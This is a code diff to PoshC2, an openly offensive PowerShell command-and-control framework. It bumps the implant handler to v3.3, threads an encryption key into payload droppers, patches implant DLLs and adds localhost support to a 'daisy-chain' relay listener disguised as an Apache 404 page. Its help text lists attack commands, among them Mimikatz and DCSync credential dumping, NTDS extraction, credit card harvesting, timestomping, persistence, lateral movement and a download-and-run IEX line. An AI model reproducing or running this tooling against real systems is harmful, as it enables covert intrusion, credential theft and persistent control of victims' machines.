@@ -45,9 +45,15 @@ function Implant-Handler
     $ipv4address = $c2serverresults.HostnameIP
     $serverport = $c2serverresults.ServerPort
     $URLS =  $c2serverresults.URLS
+    $EncKey =  $c2serverresults.EncKey
     $SocksURLS =  $c2serverresults.SocksURLS
     $Insecure =  $c2serverresults.Insecure
     $useragent =  $c2serverresults.UserAgent
+
+    $urlstring = $URLS
+    $newImplant = $urlstring -split ","
+    $newImplantURL = $newImplant[0] -replace '"',''
+
     $Host.ui.RawUI.WindowTitle = "PoshC2 Implant Handler: $ipv4address Port $serverport"
         
 $head = '
@@ -118,7 +124,7 @@ $header = '
             Write-Host -Object "|   |  Y Y  \  |_> >  |__/ __ \|   |  \  |  \___ \ " -ForegroundColor Green
             Write-Host -Object "|___|__|_|  /   __/|____(____  /___|  /__| /____  >" -ForegroundColor Green
             Write-Host -Object "          \/|__|             \/     \/          \/ " -ForegroundColor Green
-            Write-Host "============== v3.2 www.PoshC2.co.uk =============" -ForegroundColor Green
+            Write-Host "============== v3.3 www.PoshC2.co.uk =============" -ForegroundColor Green
             Write-Host ""
             foreach ($implant in $dbresults) 
             { 
@@ -447,7 +453,8 @@ $header = '
         write-host " CreateProxyPayload -user <dom\user> -pass <pass> -proxyurl <http://10.0.0.1:8080>" -ForegroundColor Green  
     }
 
-    function print-help {
+    function print-help($t=0) {
+    if (($t -eq 1) -or ($t -eq 0)) {
         write-host `n "Implant Features: " -ForegroundColor Green
         write-host "=====================" -ForegroundColor Red
         write-host " Beacon 60s / Beacon 10m / Beacon 2h"-ForegroundColor Green 
@@ -471,9 +478,10 @@ $header = '
         write-host " LoadModule <modulename>" -ForegroundColor Green 
         write-host " LoadModule Inveigh.ps1" -ForegroundColor Green
         write-host " Get-UserInfo" -ForegroundColor Green
+        write-host " Invoke-HostEnum -All" -ForegroundColor Green
         write-host " Invoke-Expression (Get-Webclient).DownloadString(`"https://module.ps1`")" -ForegroundColor Green
         write-host " StartAnotherImplant or SAI" -ForegroundColor Green 
-        write-host " Invoke-DaisyChain -name dc1daisy -daisyserver http://192.168.1.1 -port 80 -c2port 80 -c2server http://c2.goog.com -domfront aaa.clou.com -proxyurl http://10.0.0.1:8080 -proxyuser dom\test -proxypassword pass" -ForegroundColor Green
+        write-host " Invoke-DaisyChain -name dc1daisy -daisyserver http://192.168.1.1 -port 80 -c2port 80 -c2server http://c2.goog.com -domfront aaa.clou.com -proxyurl http://10.0.0.1:8080 -proxyuser dom\test -proxypassword pass -localhost (optional if low level user)" -ForegroundColor Green
         write-host " CreateProxyPayload -user <dom\user> -pass <pass> -proxyurl <http://10.0.0.1:8080>" -ForegroundColor Green
         write-host " Get-MSHotfixes" -ForegroundColor Green 
         write-host " Get-FireWallRulesAll | Out-String -Width 200" -ForegroundColor Green 
@@ -485,6 +493,9 @@ $header = '
         write-host " Get-CreditCardData -Path 'C:\Backup\'" -ForegroundColor Green
         write-host " TimeStomp C:\Windows\System32\Service.exe `"01/03/2008 12:12 pm`"" -ForegroundColor Green
         write-host " iCacls C:\Windows\System32\ResetPassword.exe /grant Administrator:F" -ForegroundColor Green
+        write-host " Get-AllFirewallRules C:\temp\rules.csv" -ForegroundColor Green
+        write-host " Get-AllServices" -ForegroundColor Green
+    } if (($t -eq 0) -or ($t -eq 2)) {
         write-host `n "Privilege Escalation: " -ForegroundColor Green
         write-host "====================" -ForegroundColor Red
         write-host " Invoke-AllChecks" -ForegroundColor Green
@@ -496,6 +507,7 @@ $header = '
         write-host " Get-GPPPassword" -ForegroundColor Green 
         write-host " Get-Content 'C:\ProgramData\McAfee\Common Framework\SiteList.xml'" -ForegroundColor Green
         write-host " Dir -Recurse | Select-String -pattern 'password='" -ForegroundColor Green
+    } if (($t -eq 0) -or ($t -eq 3)) {
         write-host `n "File Management: " -ForegroundColor Green
         write-host "====================" -ForegroundColor Red
         write-host " Download-File -Source 'C:\Temp Dir\Run.exe'" -ForegroundColor Green
@@ -509,7 +521,7 @@ $header = '
         write-host " InstallExe-Persistence" -ForegroundColor Green
         write-host " RemoveExe-Persistence" -ForegroundColor Green
         write-host " Install-ServiceLevel-Persistence | Remove-ServiceLevel-Persistence" -ForegroundColor Green 
-        write-host " Install-ServiceLevel-PersistenceWithProxy | Remove-ServiceLevel-Persistence" -ForegroundColor Green 
+        write-host " Install-ServiceLevel-PersistenceWithProxy | Remove-ServiceLevel-Persistence" -ForegroundColor Green
         write-host `n "Network Tasks / Lateral Movement: " -ForegroundColor Green
         write-host "==================" -ForegroundColor Red
         write-host " Get-ExternalIP" -ForegroundColor Green
@@ -519,6 +531,7 @@ $header = '
         write-host " Invoke-WMIExec -Target 192.168.100.20 -Domain TESTDOMAIN -Username TEST -Hash/-Pass -Command `"net user SMBExec Winter2017 /add`"" -ForegroundColor Green
         write-host " Net View | Net Users | Net localgroup administrators | Net Accounts /dom " -ForegroundColor Green
         write-host " Whoami /groups | Whoami /priv " -ForegroundColor Green  
+    } if (($t -eq 0) -or ($t -eq 4)) {
         write-host `n "Active Directory Enumeration: " -ForegroundColor Green
         write-host "==================" -ForegroundColor Red
         write-host " Invoke-ACLScanner" -ForegroundColor Green
@@ -548,6 +561,7 @@ $header = '
         write-host " Invoke-MapDomainTrust" -ForegroundColor Green 
         write-host ' Get-NetUser -domain child.parent.com -Filter samaccountname=test' -ForegroundColor Green 
         write-host ' Get-NetGroup -domain child.parent.com | select samaccountname' -ForegroundColor Green 
+    } if (($t -eq 0) -or ($t -eq 5)) {
         write-host `n "Domain / Network Tasks: " -ForegroundColor Green
         write-host "==================" -ForegroundColor Red
         write-host " Invoke-BloodHound -CollectionMethod 'Stealth' -CSVFolder C:\temp\" -ForegroundColor Green
@@ -584,6 +598,7 @@ $header = '
         write-host " Invoke-WMIExec -Target <ip> -Domain <dom> -Username <user> -Password '<pass>' -Hash <hash-optional> -command <cmd>" -ForegroundColor Green
         #write-host " EnableWinRM | DisableWinRM -computer <dns/ip> -user <dom\user> -pass <pass>" -ForegroundColor Green
         write-host " Invoke-WinRMSession -IPAddress <ip> -user <dom\user> -pass <pass>" -ForegroundColor Green
+    } if (($t -eq 0) -or ($t -eq 6)) {
         write-host `n "Credentials / Tokens / Local Hashes (Must be SYSTEM): " -ForegroundColor Green
         write-host "=========================================================" -ForegroundColor Red
         write-host " Invoke-Mimikatz | Out-String | Parse-Mimikatz" -ForegroundColor Green
@@ -604,6 +619,7 @@ $header = '
         write-host " Invoke-Mimikatz -Command $($tick)$($speechmarks)lsadump::dcsync /domain:domain.local /user:administrator$($speechmarks)$($tick)" -ForegroundColor Green
         write-host " Invoke-DCSync -PWDumpFormat" -ForegroundColor Green
         write-host " Dump-NTDS -EmptyFolder <emptyfolderpath>" -ForegroundColor Green
+    } if (($t -eq 0) -or ($t -eq 7)) {
         write-host `n "Useful Modules: " -ForegroundColor Green
         write-host "====================" -ForegroundColor Red
         write-host " Show-ServerInfo" -ForegroundColor Green 
@@ -636,6 +652,7 @@ $header = '
         write-host "=====================" -ForegroundColor Red
         write-host " Back" -ForegroundColor Green 
         write-host " Exit" `n -ForegroundColor Green 
+        }
     }
 
     # call back command
@@ -731,20 +748,18 @@ primer | iex }'
             $dllOffset = 0x00017100
         }
 
-        # Patch DLL - replace 5000 A's
-        $AAAA = "A"*5000
-        $AAAABytes = ([System.Text.Encoding]::UNICODE).GetBytes($AAAA)
+        # Patch DLL - replace 8000 A's
         $replaceStringBytes = ([System.Text.Encoding]::UNICODE).GetBytes($replaceString)
     
         # Length of replacement code
         $dllLength = $replaceString.Length
-        $patchLength = 5000 -$dllLength
+        $patchLength = 8000 -$dllLength
         $nullString = 0x00*$patchLength
         $nullBytes = ([System.Text.Encoding]::UNICODE).GetBytes($nullString)
         $nullBytes = $nullBytes[1..$patchLength]
         $replaceNewStringBytes = ($replaceStringBytes+$nullBytes)
 
-        $dllLength = 10000 -3
+        $dllLength = 16000 -2
         $i=0
         # Loop through each byte from start position
         $dllOffset..($dllOffset + $dllLength) | % {
@@ -766,9 +781,9 @@ function CreateProxyPayload
         [Parameter(Mandatory=$true)][string]$proxyurl
     )
     if ($Insecure -eq "Yes") {
-        $command = createdropper -Proxy -killdate $killdatefm -domainfrontheader $DomainFrontHeader -ipv4address $ipv4address -serverport $serverport -username $username -password $password -proxyurl $proxyurl -Insecure -useragent $useragent
+        $command = createdropper -enckey $enckey -Proxy -killdate $killdatefm -domainfrontheader $DomainFrontHeader -ipv4address $ipv4address -serverport $serverport -username $username -password $password -proxyurl $proxyurl -Insecure -useragent $useragent
     } else {
-        $command = createdropper -Proxy -killdate $killdatefm -domainfrontheader $DomainFrontHeader -ipv4address $ipv4address -serverport $serverport -username $username -password $password -proxyurl $proxyurl -useragent $useragent
+        $command = createdropper -enckey $enckey -Proxy -killdate $killdatefm -domainfrontheader $DomainFrontHeader -ipv4address $ipv4address -serverport $serverport -username $username -password $password -proxyurl $proxyurl -useragent $useragent
     }
             
     $payload = createrawpayload -command $command
@@ -786,17 +801,25 @@ param(
 [Parameter(Mandatory=$true)][string]$daisyserver,
 [Parameter(Mandatory=$true)][string]$c2server, 
 [Parameter(Mandatory=$true)][string]$c2port, 
-[Parameter(Mandatory=$true)][AllowEmptyString()][string]$domfront, 
-[Parameter(Mandatory=$true)][AllowEmptyString()][string]$proxyurl, 
-[Parameter(Mandatory=$true)][AllowEmptyString()][string]$proxyuser, 
-[Parameter(Mandatory=$true)][AllowEmptyString()][string]$proxypassword)
+[Parameter(Mandatory=$false)][switch]$Localhost,
+[Parameter(Mandatory=$false)][AllowEmptyString()][string]$domfront, 
+[Parameter(Mandatory=$false)][AllowEmptyString()][string]$proxyurl, 
+[Parameter(Mandatory=$false)][AllowEmptyString()][string]$proxyuser, 
+[Parameter(Mandatory=$false)][AllowEmptyString()][string]$proxypassword)
 
 $fw = Read-Host "Do you want to create a firewall rule for this: Y/N"
 if ($fw -eq "Y") {
     $fwcmd = "Netsh.exe advfirewall firewall add rule name=`"Daisy`" dir=in action=allow protocol=TCP localport=$port enable=yes"
 }
 
-$command = createdropper -Daisy -killdate $killdatefm -ipv4address $daisyserver -serverport $port 
+if ($Localhost.IsPresent){
+$HTTPServer = "localhost"
+$daisyserver = "http://localhost"
+} else {
+$HTTPServer = "+"
+}
+
+$command = createdropper -enckey $enckey -Daisy -killdate $killdatefm -ipv4address $daisyserver -serverport $port 
 $payload = createrawpayload -command $command
 
 # create proxy payloads
@@ -807,6 +830,7 @@ CreateDLL -DaisyName $name
 
 [IO.File]::WriteAllLines("$FolderPath\payloads\$($name).bat", $payload)
 Write-Host -Object "Payload written to: $FolderPath\payloads\$($name).bat"  -ForegroundColor Green
+
 
 $fdsf = @"
 `$username = "$proxyuser"
@@ -831,8 +855,6 @@ if (`$h) {`$wc.Headers.Add("Host",`$h)}
 if (`$proxyurl) {
 `$wp = New-Object System.Net.WebProxy(`$proxyurl,`$true); 
 `$wc.Proxy = `$wp;
-} else {
-`$wc.Proxy = [System.Net.GlobalProxySelection]::GetEmptyWebProxy()
 }
 if (`$username -and `$password) {
 `$PSS = ConvertTo-SecureString `$password -AsPlainText -Force; 
@@ -852,14 +874,14 @@ if (`$cookie) {
 <title>404 Not Found</title>
 </head><body>
 <h1>Not Found</h1>
-<p>The requested URL was not found on this server.</p>
+<p>The requested URL/s was not found on this server.</p>
 <hr>
 <address>Apache (Debian) Server</address>
 </body></html>
 '
-`$URLS = $($URLS),$($SocksURLS),"/connect","/daisy","/proxy"
+`$URLS = $($URLS),$($SocksURLS)
 `$listener = New-Object -TypeName System.Net.HttpListener 
-`$listener.Prefixes.Add("http://+:`$serverport/") 
+`$listener.Prefixes.Add("http://$($HTTPServer):`$serverport/") 
 `$listener.Start()
 echo "started http server"
 while (`$listener.IsListening) 
@@ -871,8 +893,7 @@ while (`$listener.IsListening)
     `$response = `$context.Response       
     `$url = `$request.RawUrl
     `$method = `$request.HttpMethod
-    if (`$null -ne (`$URLS | ? { `$url -match `$_ }) ) 
-    {  
+    if (`$null -ne (`$URLS | ? { `$url -match `$_ }) ) {
         `$cookiesin = `$request.Cookies -replace 'SessionID=', ''
         `$responseStream = `$request.InputStream 
         `$targetStream = New-Object -TypeName System.IO.MemoryStream 
@@ -940,6 +961,7 @@ $fwcmd
 `$kill.log = "1"
 function Stop-Daisy {
 `$kill.log = 2
+Netsh.exe advfirewall firewall del rule name=`"Daisy`"
 (new-object system.net.webclient).downloadstring("http://localhost:$port")
 }
 if (!`$t) { 
@@ -950,9 +972,22 @@ if (!`$t) {
         `$Jobs = @()
         `$Job = [powershell]::Create().AddScript({$NewScript})
         `$Job.Runspace = `$Runspace
+        `$Job.BeginInvoke() | Out-Null
+        echo ""
+        echo "[+] Running DaisyServer as Administrator:"
+    } else { 
+        `$Runspace = [RunspaceFactory]::CreateRunspace()
+        `$Runspace.Open()
+        `$Runspace.SessionStateProxy.SetVariable('Kill',`$Kill)
+        `$Jobs = @()
+        `$Job = [powershell]::Create().AddScript({$NewScript})
+        `$Job.Runspace = `$Runspace
         `$Job.BeginInvoke() | Out-Null 
-    }
-    echo "To stop the Daisy Server, Stop-Daisy current process"
+        echo ""
+        echo "[+] Running DaisyServer as Standard User, must use -localhost flag for this to work:"
+    }  
+
+    echo "[+] To stop the Daisy Server, Stop-Daisy current process"
 }
 
 "@
@@ -1815,6 +1850,10 @@ param
             {
                 CheckModuleLoaded "Invoke-WMICommand.ps1" $psrandomuri
             }
+            if ($pscommand.tolower().startswith('invoke-hostenum'))
+            {
+                CheckModuleLoaded "Invoke-HostEnum.ps1" $psrandomuri
+            }
             if ($pscommand.tolower().startswith('dump-ntds'))
             {
                 CheckModuleLoaded "dump-ntds.ps1" $psrandomuri
@@ -2182,8 +2221,13 @@ while($true)
             elseif ($global:command -eq 'help') 
             {
                 print-help
+            }
+            elseif ($global:command.ToLower().StartsWith('help')) 
+            {
+                $global:command = $global:command -replace 'help ',''
+                print-help $global:command
             } 
-            elseif ($global:command -eq '?') 
+            elseif ($global:command -eq '?')  
             {
                 print-help
             }
@@ -2216,11 +2260,16 @@ while($true)
             elseif ($global:command -eq 'help') 
             {
                 print-help
+            }
+            elseif ($global:command.ToLower().StartsWith('help')) 
+            {
+                $global:command = $global:command -replace 'help ',''
+                print-help $global:command
             } 
-            elseif ($global:command -eq '?') 
+            elseif ($global:command -eq '?')  
             {
                 print-help
-            } 
+            }
             else 
             {
                 $global:implantid.split(",")| foreach {
@@ -2249,11 +2298,16 @@ while($true)
             elseif ($global:command -eq 'help') 
             {
                 print-help
+            }
+            elseif ($global:command.ToLower().StartsWith('help')) 
+            {
+                $global:command = $global:command -replace 'help ',''
+                print-help $global:command
             } 
-            elseif ($global:command -eq '?') 
+            elseif ($global:command -eq '?')  
             {
                 print-help
-            } 
+            }
             else 
             {
                 #write-host $global:command $global:randomuri
